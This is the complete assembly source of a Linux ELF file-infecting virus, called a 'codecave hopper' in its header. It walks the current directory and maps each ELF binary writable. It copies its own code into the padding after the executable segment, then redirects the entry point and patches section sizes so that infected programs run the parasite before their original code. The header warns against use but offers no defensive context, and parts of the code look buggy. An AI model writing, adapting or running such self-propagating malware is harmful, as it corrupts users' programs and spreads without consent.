BITS 64

; ====================================================================
;
; fct
; codecave hopper
; scans all binaries in folder for codecaves and copies itself into the cave
; modifies the elf header to allow normal execution
; executes the binary, causing chaos in the wrong enviroment  
; USE WITH EXTREME CAUTION (don't use)
;
; ====================================================================

;--------- CONSTANTS ---------; 
; file syscall numbers
SYS_WRITE   equ 0x1         
SYS_READ    equ 0x0         
SYS_CLOSE   equ 0x3         
SYS_EXIT    equ 0x3c        
SYS_OPEN    equ 0x2         

SYS_LSTAT   equ 0x6
SYS_MMAP    equ 0x9
SYS_MUNMAP  equ 0xb
SYS_FORK    equ 0x39

SYS_GETDENTS64  equ 0xd9

; open macros
O_RDONLY equ 0x0
O_WRONLY equ 0x1
O_RDWR   equ 0x2
O_CREAT  equ 0x40
BUFSIZ   equ 0x2000
STATSIZ  equ 0x90
SIZOFF   equ 0x30

O_DIRECTORY equ 0x10000
DT_DIR      equ 0x4

PROT_READ  equ 0x1
PROT_WRITE equ 0x2
MAP_SHARED equ 0x1

; elf
E_TYPEOFF    equ 0x10
ET_EXEC      equ 0x2
ET_DYN       equ 0x3
EI_CLASSOFF  equ 0x4
E_ENTRYOFF   equ 0x18
ELFCLASS32   equ 0x1
E_PHOFFOFF   equ 0x20
E_PHNUMOFF   equ 0x38
E_SHOFFOFF   equ 0x28
E_SHNUMOFF   equ 0x3c
PHDRSIZ      equ 0x38
SHDRSIZ      equ 0x40
P_TYPEOFF    equ 0
P_FLAGSOFF   equ 0x4
P_OFFSETOFF  equ 0x8
P_FILESZOFF  equ 0x20
P_VADDROFF   equ 0x10
P_MEMSZOFF   equ 0x28
PT_LOAD      equ 0x1
PF_R         equ 0x4
PF_W         equ 0x2
PF_X         equ 0x1
SH_SIZEOFF   equ 0x20
SH_OFFSETOFF equ 0x18

ID          equ 0x1313131313131313
PLACEHOLDER equ 0xAAAAAAAAAAAAAAAA
ALLOC_SPACE equ 0x20
;--------- CONSTANTS ---------; 


;; --- CODE ---

self_start equ $
_start:
    push rax
    push rdi
    push rsi
    push rdx
    push rcx
    push rbp
    push rsp
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    xor rax, rax
    mov al, SYS_FORK
    syscall
    test rax, rax
    jz clean_exit

intmain:

    ;; int r9 = open(".", O_DIRECTORY)
    ;; if (r9 < 0) return 1
    mov rax, ID
    xor rax, rax
    push '.'
    mov rdi, rsp
    mov rsi, O_DIRECTORY
    mov al, SYS_OPEN
    syscall
    cmp rax, 0
    jle exit
    mov r9, rax

    ;; size_t r10 = getdents64(r9, (struct linux_dirent *)rsp, BUFSIZ)
    xor rax, rax
    sub rsp, BUFSIZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, BUFSIZ
    mov al, SYS_GETDENTS64
    syscall
    cmp rax, 0
    jl exit
    mov r10, rax

    ;; close(r9)
    mov rdi, r9
    xor rax, rax
    mov al, SYS_CLOSE
    syscall

dirloop:
    ;; while (r10 > 0) {
    mov rdi, rsp
    xor r9, r9
    mov r15b, byte [rsp+0x12]
    ;;     unsigned short r9w = d_reclen   // rsp+0x10
    mov r9w, word [rsp+0x10]   
    ;;     rsp += r9W   // (next dirent)
    add rsp, r9                
    ;;     r10 -= r9w 
    sub r10, r9                
    test r10, r10              
    jle exit
    ;;     char r9b = d_type   // (rsp + d_reclen - 1)
    mov r9b, byte [rsp-1]    

    ;;     if (d_type != DT_DIR) parasite(d_name)
    cmp r15b, byte DT_DIR  
    je dirloop
    add rdi, 0x13
    call parasite
    jmp dirloop


;; parasite(char *rdi)
parasite:
; ----- VARS ------
elf_map         equ STATSIZ
phdr_entry      equ STATSIZ-8
padsiz          equ STATSIZ-8*2
code_start      equ STATSIZ-8*3
para_offset     equ STATSIZ-8*4
para_load_addr  equ STATSIZ-8*5
old_entry       equ STATSIZ-8*6
; ----- VARS ------
        push rsi
        push rdx
        push rcx
        push rbp
        push rsp
        push r9
        push r10
        push r11
        push r12
        push r13
        push r14
        push r15

        enter STATSIZ+0x10, 0

;;      if (lstat(argv[1], rsp) != 0) return
        mov rsi, rsp
        xor rax, rax
        mov al, SYS_LSTAT
        syscall
        test rax, rax
        jnz para_ret 

;;      if ((fd = open(argv[1], O_RDONLY)) < 0) return
        xor rsi, rsi
        mov esi, O_RDWR
        mov al, SYS_OPEN
        syscall
        cmp rax, 0
        jl para_ret

;;      r14 = rsp.st_size
        mov r14, [rsp+SIZOFF]

;;      if ((elf_map = mmap(NULL, r14, PROT_WRITE,
;;                  MAP_SHARED, fd, 0)) == MAP_FAILED) return 1;
        xor rdi, rdi
        mov rsi, r14
        xor rdx, rdx
        mov dl, PROT_READ | PROT_WRITE
        xor r10, r10 
        mov r10b, MAP_SHARED
        mov r8, rax
        xor r9, r9
        xor rax, rax
        mov al, SYS_MMAP
        syscall
        cmp rax, 0
        jl para_ret 

;;      if (elf_map->E_TYPEOFF != ET_EXEC && elf_map->E_TYPEOFF != ET_DYN) return 1;
        mov [rbp+elf_map], rax
        cmp word [rax+E_TYPEOFF], ET_EXEC
        je type_OK
        cmp word [rax+E_TYPEOFF], ET_DYN
        je type_OK
        cmp byte [rax+EI_CLASSOFF], ELFCLASS32 
        je para_ret 

type_OK:
        mov [rbp+phdr_entry], rax
        mov r9, [rax+E_PHOFFOFF]
        add [rbp+phdr_entry], r9
        mov rbx, [rbp+phdr_entry]

;;      r8 = phdr_entry + hdr->e_phnum;
        xor r8, r8
        mov r8w, word [rax+E_PHNUMOFF]
        imul r8, PHDRSIZ
        add r8, rbx

        xor r15, r15
        mov [rbp+para_offset], r15
        
;;          while (1) {
find_pading:
;;          if (rbx->P_TYPE == PT_LOAD && rbx->P_FLAGS == (PF_R | PF_X)) {
            cmp dword [rbx+P_TYPEOFF], PT_LOAD
            jnz not_our_section
            cmp dword [rbx+P_FLAGSOFF], PF_R | PF_X
            jnz not_our_section

;;              code_start = rbx->P_OFFSET;
                mov r15, [rbx+P_OFFSETOFF]
                mov [rbp+code_start], r15

;;              para_offset = code_start + rbx->P_FILESZ;
                add r15, [rbx+P_FILESZOFF]
                mov [rbp+para_offset], r15

;;              para_load_addr = rbx->P_VADDR + rbx->P_FILESZ
                mov r15, [rbx+P_VADDROFF]
                add r15, [rbx+P_FILESZOFF]
                mov [rbp+para_load_addr], r15

;;              while (rbx++ < r8)
find_pading2:
                add rbx, PHDRSIZ
                cmp rbx, r8
                jg find_pading_end

;;                  if (rbx->p_type  == PT_LOAD &&
;;                      rbx->p_flags == (PF_R | PF_W)) {
                    cmp dword [rbx+P_TYPEOFF], PT_LOAD
                    jnz find_pading2 
                    cmp dword [rbx+P_FLAGSOFF], PF_W | PF_R
                    jnz find_pading2 
                        
;;                      pad_size = (rbx->p_offset - para_offset);
                        mov r15, [rbx+P_OFFSETOFF]
                        sub r15, [rbp+para_offset]
                        mov [rbp+padsiz], r15
                        jmp find_pading_end
;;                  }


not_our_section:
            add rbx, PHDRSIZ
            cmp rbx, r8
            jle find_pading

;;          }
find_pading_end:

        mov rbx, rax
        mov r8, rbx
        add r8, para_size

        mov r9, PLACEHOLDER
        mov r10, ID
            
        ;; while (rbx < elf_map + para_size) {
replace_placeholder:
        cmp rbx, r8
        jge replace_placeholder_end

            ;; if (*rbx == ID) {
            ;;    return 
            cmp r10, [rbx]
            je para_ret

            ;; if (*rbx == PLACEHOLDER)  {
                ;; *rbx = old_entry
                ;; break
            ;;}
            
            cmp r9, [rbx]
            je rpls

        ;; rbx++
        inc rbx
        jmp replace_placeholder

rpls:
        mov r15, [rbp+old_entry]
        mov [rbx], r15
replace_placeholder_end:


        ;; if (padsiz < parasz) return 1
        cmp dword [rbp+padsiz], para_size
        jl para_ret 

        ;; old_entry = rax->e_entry;
        mov r15, [rax+E_ENTRYOFF]
        mov [rbp+old_entry], r15

        ;; rax->e_entry = para_offset
        mov r15, [rbp+para_offset]
        mov [rax+E_ENTRYOFF], r15

        ;; rbx = elf_map + hdr->e_shoff;
        mov rbx, rax
        add rbx, [rax+E_SHOFFOFF]

        ;; r8 = sht_entry + hdr->e_shnum;
        xor r8, r8
        mov r8w, [rax+E_SHNUMOFF]
        imul r8w, SHDRSIZ
        add r8, rbx

        ;; while(rbx < r8) {
mod_sht:
            ;; if (rbx->sh_offset + rbx->sh_size == para_offset) {
            mov r15, [rbx+SH_OFFSETOFF]
            add r15, [rbx+SH_SIZEOFF]
            cmp r15, [rbp+para_offset]
            jne next_sht

                ;; rbx->sh_size += para_size
                mov r15, [rbp+para_size]
                add [rbx+SH_SIZEOFF], r15

                ;; break
                jmp mod_sht_end
            ;; }

            ;; r8 += SHDRSIZ
next_sht:
        add rbx, SHDRSIZ
        cmp rbx, r8
        jle mod_sht
mod_sht_end:
        ;; }
        
        ;; memcpy(rbx+para_offset, para, para_size)
        mov rcx, para_size
        mov rdi, rax
        add rdi, [rbp+para_offset]
        mov rsi, self_start
        rep movsb

        ;; munmap(elf_map, r14)
        mov rdi, rax
        mov rsi, r14
        xor rax, rax
        mov al, SYS_MUNMAP
        syscall

        ;; munmap(elf_map, r14)
        mov rdi, rax
        mov rsi, r14
        xor rax, rax
        mov al, SYS_MUNMAP
        syscall

para_ret:
        leave

        pop r15
        pop r14
        pop r13
        pop r12
        pop r11
        pop r10
        pop r9
        pop rsp
        pop rbp
        pop rcx
        pop rdx
        pop rsi

        ret

exit:
    xor rdi, rdi
    xor rax, rax
    mov al, SYS_EXIT 
    syscall


clean_exit:
;--------------------------------------------------------------------
    ; open file in memory
    ; int open(const char *pathname, int flags)
    xor rax, rax
    xor rdi, rdi
    lea	rdi, [rel filepath]     ; pathname
    xor rsi, rsi                ; 0 for O_RDONLY macro
    mov al, SYS_OPEN            ; syscall number for open()
    syscall

; RBX stores the address where the binary is loaded

    ; AL stores the fd returned by open() syscall
    ; ssize_t read(int fd, void *buf, size_t count);
    ;
    xor r10, r10                ; Zeroing out temporary registers
    xor r8, r8
    xor rdi, rdi
    xor rbx, rbx
    mov dil, al                 ; fd    : al
    sub sp, ALLOC_SPACE         ; allocate space for /proc/<pid>/maps memory address string
                                ; (Max 16 chars from file | usually 12 chars 5567f9154000)
    lea rsi, [rsp]              ; *buf  : get the content to be read on stack
    xor rdx, rdx
    mov dx, 0x1                 ; count : Read 0x1 byte from file at a time
    xor rax, rax

read_characters:
    xor rax, rax
    syscall
    cmp BYTE [rsp], 0x2d
    je  done
    add r10b, 0x1
    mov r8b, BYTE [rsp]

    cmp r8b, 0x39
    jle digit_found

alphabet_found:
    sub r8b, 0x57
    jmp load_into_rbx

digit_found:
    sub r8b, 0x30

load_into_rbx:
    shl rbx, 0x4
    or  rbx, r8

loop:
    add rsp, 0x1
    lea rsi, [rsp]
    jmp read_characters


done:
    sub sp, r10w
    add sp, ALLOC_SPACE
    xor r8, r8
    mov r8, rbx
    mov r10, PLACEHOLDER
    add r8, r10

;-------------------------------------------------------------------


address_loaded_in_RBX:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop rsp
    pop rbp
    pop rcx
    pop rdx
    pop rsi
    pop rdi
    pop rax
 
    jmp	r8

    filepath: db "/proc/self/maps", 0x0
para_size equ $-_start
